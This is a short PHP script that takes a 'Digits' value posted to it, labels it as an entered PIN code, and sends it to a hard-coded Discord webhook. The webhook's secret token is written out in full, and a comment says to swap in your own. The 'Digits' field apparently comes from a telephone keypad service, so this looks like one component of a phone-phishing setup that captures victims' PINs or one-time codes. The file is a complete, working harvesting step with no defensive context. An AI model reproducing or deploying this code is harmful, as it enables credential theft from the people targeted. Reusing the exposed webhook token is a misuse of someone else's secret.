<?php
$pin = $_POST['Digits'];
$webhookurl = "https://discord.com/api/webhooks/996362386757926912/qt4taoKg1iFZZQA7ShtH1VmECjN983AJYwCEJM3bBJdK9TtMhOZ1KxvaX-NNZEdEuQd4"; // replace with your webhook URL
$json_data = array ('content'=> "PIN code entered: ".$pin);
$make_json = json_encode($json_data);
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
$result = curl_exec( $ch );
?>
